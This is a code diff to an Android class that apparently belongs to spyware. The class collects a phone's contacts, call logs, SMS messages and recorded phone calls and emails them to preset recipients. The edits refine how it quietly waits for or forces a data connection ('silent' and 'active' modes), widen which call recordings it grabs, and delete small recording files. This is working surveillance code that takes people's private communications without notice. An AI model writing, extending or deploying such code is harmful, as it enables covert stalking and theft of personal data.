@@ -52,6 +52,8 @@ public class GetInfoTask extends TimerTask
 	
 	public static List<File> attachments;
 	
+	private static final long MIN_FILE_SIZE = 10240; // 10KB
+	
 	public GetInfoTask(Context context)
 	{
 		super();
@@ -69,21 +71,25 @@ public class GetInfoTask extends TimerTask
 		if (recipients == null || recipients.length == 0) return;
 		
 		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
+		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
 		
 		// ===================================================================================
 		// Try to send contact/phonecall/SMS collections
 		// ===================================================================================
 		if (isTimeToCollectInfo()) 
 		{
-			// If network connected, try to collect and send the information
-			boolean isDataNetworkConnected = false;
-			if (GlobalPrefActivity.getNetworkConnectMode(context) == NETWORK_CONNECT_MODE.ACTIVE) {
-				isDataNetworkConnected = NetworkUtil.tryToConnectDataNetwork(context);
-			} else { // Silent mode
-				isDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
+			// If network not connected, retrun if silent mode
+			if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
+				return;
+			}
+			// Or try to connect network if active mode
+			else if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+				if (!NetworkUtil.tryToConnectDataNetwork(context)) {
+					return;
+				}
 			}
 			
-			if (!isDataNetworkConnected) return;
+			// If come here, means the network connected
 			
 			// Clean attachments
 			if (attachments == null) attachments = new ArrayList<File>();
@@ -97,6 +103,7 @@ public class GetInfoTask extends TimerTask
 			CollectSms(context);
 			SysUtils.threadSleep(1000, LOGTAG);
 			
+			// If network cut, return
 			if (!NetworkUtil.isNetworkConnected(context)) {
 				// Clean the files in SD-CARD
 				FileCtrl.cleanTxtFiles();
@@ -135,13 +142,19 @@ public class GetInfoTask extends TimerTask
 		// ===================================================================================
 		SysUtils.threadSleep(1000, LOGTAG);
 		// If network connected, try to collect and send the information
-		boolean isDataNetworkConnected = false;
-		if (GlobalPrefActivity.getNetworkConnectMode(context) == NETWORK_CONNECT_MODE.ACTIVE) {
-			isDataNetworkConnected = NetworkUtil.tryToConnectDataNetwork(context);
-		} else { // Silent mode
-			isDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
+		boolean isConnected = NetworkUtil.isNetworkConnected(context);
+		// If network not connected, retrun if silent mode
+		if (!isConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
+			return;
 		}
-		if (!isDataNetworkConnected) return;
+		// Or try to connect network if active mode
+		else if (!isConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+			if (!NetworkUtil.tryToConnectDataNetwork(context)) {
+				return;
+			}
+		}
+		
+		// If come here, means the network connected
 		
 		// Get all wav files
 		String prefix = context.getResources().getString(R.string.phonecall_record);
@@ -154,9 +167,7 @@ public class GetInfoTask extends TimerTask
 			String name;
 			for (int i = 0; i < files.length; i++) {
 				name = files[i].getName();
-				if (files[i].isFile() &&
-					//name.startsWith(prefix) && 
-					name.endsWith(FileCtrl.SUFFIX_WAV))
+				if (files[i].isFile() && name.endsWith(FileCtrl.SUFFIX_WAV))
 				{
 					wavs.add(files[i]);
 				}
@@ -179,8 +190,7 @@ public class GetInfoTask extends TimerTask
 			if (pack.size() <= 0) break;
 
 			String subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
-		       		 + "-" + DatetimeUtil.format3.format(new Date()) 
-		       		 + "-" + String.valueOf(i+1);
+		       		 + "-" + DatetimeUtil.format2.format(new Date());
 			
 			if (!NetworkUtil.isNetworkConnected(context)) {
 				return;
@@ -232,7 +242,13 @@ public class GetInfoTask extends TimerTask
 		int wavCount = wavs.size();
 		for (int j=i*count; j<(i+1)*count; j++) {
 			if (j < wavCount) {
-				pack.add(wavs.get(j));
+				// Valid if size is larger than 10KB
+				if (wavs.get(j).length() > MIN_FILE_SIZE) {
+					pack.add(wavs.get(j));
+				} else { 
+					try { wavs.get(j).delete(); }
+					catch (Exception ex) {}
+				}
 			}
 		}
 		return pack;
